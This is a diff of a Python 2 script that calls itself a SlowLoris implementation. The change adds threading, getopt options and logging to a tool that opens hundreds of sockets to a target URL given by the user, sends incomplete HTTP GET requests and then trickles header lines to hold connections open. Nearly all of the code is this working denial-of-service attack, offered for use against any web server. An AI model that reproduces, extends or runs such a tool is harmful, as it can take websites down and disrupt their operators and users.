@@ -1,27 +1,37 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
 
+import re
 import os
 import sys
 import time
 import random
 import socket
-import argparse
-import atexit
+import getopt
 import signal
+import logging
 import datetime
-import re
 import requests
+import threading
+from Queue import Queue
 
 headers = ['User-Agent: Mozilla/5.0 (X11; U; Linux i686; ru; rv:1.9b5) Gecko/2008050509 Firefox/3.0b5',
 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
 'Accept-Language: ru,en-us;q=0.7,en;q=0.3',
 'Accept-Charset: windows-1251,utf-8;q=0.7,*;q=0.7',
 'Connection: keep-alive']
-sokets = []
+port = 80
+sockets = []
 soketCount = 300
+liveSockets = 0
+requestsCount = 0
+dieSockets = 0
+numberOfBuilders = 3
 URL = ''
-line = '-' * 69
+line = '-' * 69 + '\n'
+lock = threading.Lock()
+logMode = 0 # 0-console, 1-file, 2-null
+startTime =  datetime.datetime.now().strftime("%Y-%m-%d %H:%M")
 
 def validateURL(url):
 	regex = re.compile(
@@ -36,104 +46,149 @@ def validateURL(url):
 def clearScreen():
 	os.system('cls' if os.name == 'nt' else 'clear')
 
-def parseArgs():
-	global soketCount, URL
-	parser = argparse.ArgumentParser()
-	parser.add_argument('-u','--url',action='store', dest='u', help='URL adress')
-	parser.add_argument('-s','--sockets', action='store', type=int,dest='s', help='Socket count')
-	arg = parser.parse_args()
+def parseLog():
+	if logMode == 0:
+		pass
+	elif logMode == 1:
+		#TODO: check access
+		sys.stdout = open('SlowLoris_log_%s.txt' % startTime, 'w')
+		sys.stderr = open('SlowLoris_log_%s_errors.txt' % startTime, 'w')
+	elif logMode == 2:
+		pass
 
-	if arg.s:
-		if 0 < arg.s < 500:
-			soketCount = arg.s
-		else:
-			sys.exit(-1)
+def writeToLog(string):
+	if logMode != 2:
+		sys.stdout.write(string)
+		sys.stdout.flush()
 
-	if arg.u:
-		if validateURL(arg.u):
-			URL = arg.u
-
-		else:
-			sys.exit(-1)
-	else:
+def parseArgs(argv):
+	global soketCount, URL, logMode
+	usage = '\nUsage: \n -u or --url\t\thttp://google.com [str]\n -s or --sockets\tsocket count in (0, 1000] [int]\n -m or --mode\t\tlog mode in [0,2] [int]\n'
+	if len(argv) < 2:
+		print usage
 		sys.exit(-1)
+	try:
+		opts, argv = getopt.getopt(argv, 'hu:s:m:', ['help','url=', 'sockets=', 'mode='])
+	except getopt.GetoptError:
+		print usage
+		sys.exit(-1)
+	for opt, arg in opts:
+		if opt in ('-h', '--help'):
+			print usage
+			sys.exit(0)
+		elif opt in ('-u', '--url'):
+			if validateURL(arg):
+				URL = arg
+			else:
+				print usage
+				sys.exit(-1)
+		elif opt in ('-s', '--sockets'):
+			cnt = int(arg)
+			if 0 < cnt <= 1000:
+				soketCount = cnt
+			else:
+				print usage
+				sys.exit(-1)
+		elif opt in ('-m', '--mode'):
+			m = int(arg)
+			if 0 <= m <= 2:
+				logMode = int(m)
+			else:
+				print usage
+				sys.exit(-1)
+	if URL == '':
+		print usage
+		sys.exit(-1)
+	parseLog()
 
 def createSocket():
-	res = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-	res.settimeout(5)
-	res.connect((URL, 80))
+	global soketCount, liveSockets
+	while True:
+		if liveSockets <= soketCount:
+			try:
+				res = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+				res.settimeout(5)
+				res.connect((URL, port))
+				res.send('GET /? %d HTTP/1.1\r\n' % random.randint(0, 99999))
+				for h in headers:
+					res.send('%s\r\n'%(h))
+# TODO add mutex on append
+				sockets.append(res)
+				liveSockets += 1
+			except Exception as e:
+				pass
 
-	res.send('GET /? %d HTTP/1.1\r\n' % random.randint(0, 99999))
-	for h in headers:
-		res.send('%s\r\n'%(h))
+def sendRequest(q):
+	global requestsCount, liveSockets, dieSockets
+	while True:
+		sok = q.get()
+		try:
+			sok.send('X-a: %d\r\n' % random.randint(0, 99999))
+			requestsCount += 1
+		except Exception as e:
+			sockets.remove(sok)
+			dieSockets += 1
+			liveSockets -= 1
+		q.task_done()
 
-	return res
+def status():
+	global liveSockets, dieSockets, requestsCount
+	while True:
+		writeToLog('\r\t\tsend: %d die: %d alive: %d' % (requestsCount, dieSockets, liveSockets))
+		time.sleep(0.3)
 
 def run():
-	global URL, soketCount
-	print '\n\t\tSlowLoris implementation by @maxkrivich\n'
-	print line
+	global URL, soketCount, liveSockets, dieSockets, requestsCount, sockets
+	writeToLog('\n\t\tSlowLoris implementation by @maxkrivich\n')
+	writeToLog(line)
 
 	response = requests.get(URL)
 	serv = response.headers.get('Server')
 	URL = URL.replace('https://', '')
 	URL = URL.replace('http://', '')
 
-	print '[*] Target IP:\t\t{}\n[*] Target Server:\t{}\n[*] Target Hostname:\t{}\n[*] Target Port:\t{}\n[*] Start Time:\t\t{}\n[*] Socket Count:\t{}'.\
-		format(socket.gethostbyname(URL),serv, URL, '80', datetime.datetime.now().strftime("%Y-%m-%d %H:%M"), soketCount)
+	writeToLog('[*] Target IP:\t\t{}\n[*] Target Server:\t{}\n[*] Target Hostname:\t{}\n[*] Target Port:\t{}\n[*] Start Time:\t\t{}\n[*] Socket Count:\t{}\n'.\
+		format(socket.gethostbyname(URL),serv, URL, port, startTime, soketCount))
 
-	print line
-	cnt = 0
-	while soketCount - cnt > 0:
-		try:
-			i = createSocket()
-			cnt += 1
-		except:
-			continue
-		sys.stdout.write('\r[*] Socket Created: %d' % cnt)
-		sys.stdout.flush()
-		sokets.append(i)
+	writeToLog(line)
 
-	sys.stdout.write('\r[+] Socket Created: %d\n' % cnt)
+	for _ in xrange(numberOfBuilders):
+		t = threading.Thread(target=createSocket).start()
 
-	sends = 0
-	die = 0
+	while liveSockets <= soketCount:
+		writeToLog('\r[*] Socket Created: %d' % liveSockets)
+
+	liveSockets = soketCount
+
+	writeToLog('\r[+] Socket Created: %d\n' % liveSockets)
+
+	q = Queue(soketCount*2)
+
+	t = threading.Thread(target=status)
+	t.daemon = True
+	t.start()
+
+	for _ in xrange(numberOfBuilders):
+		t = threading.Thread(target=sendRequest,args=(q, ))
+		t.daemon = True
+		t.start()
 
 	while True:
-		for sk in sokets:
-			try:
-				sends += 1
-				sk.send('X-a: %d\r\n' % random.randint(0, 99999))
-			except:
-				sokets.remove(sk)
-				die += 1
-				cnt -= 1
-		sys.stdout.write('\r\t\tsend: %d\t die: %d \t alive: %d' % (sends, die, cnt))
-		sys.stdout.flush()
+		if liveSockets <= soketCount:
+			time.sleep(1)
+		for s in sockets[:soketCount]:
+			q.put(s)
+			q.join()	
 
-		while soketCount - len(sokets):
-			s = createSocket()
-			cnt += 1
-			sokets.append(s)
-			sys.stdout.write('\r\t\tsend: %d\t die: %d\t alive: %d' % (sends, die, cnt))
-			sys.stdout.flush()
-
-		time.sleep(3)
-
-def ex(signal, frame):
-	print '\r'
-	print line
+def myExit(signal, frame):
+	writeToLog('\n')
+	writeToLog(line)
 	sys.exit(0)
 
 def main():
-	clearScreen()
-	if len(sys.argv) < 2:
-		print '\nUsage: \n -u or --url\t http://google.com [str]\n -s or --sockets \t socket count [int]\n\n'
-		sys.exit(-1)
-	else:
-		signal.signal(signal.SIGINT, ex)
-		parseArgs()
-
+	# clearScreen()
+	signal.signal(signal.SIGINT, myExit)
+	parseArgs(sys.argv[1:])
 	run()
 
 if __name__ == '__main__':
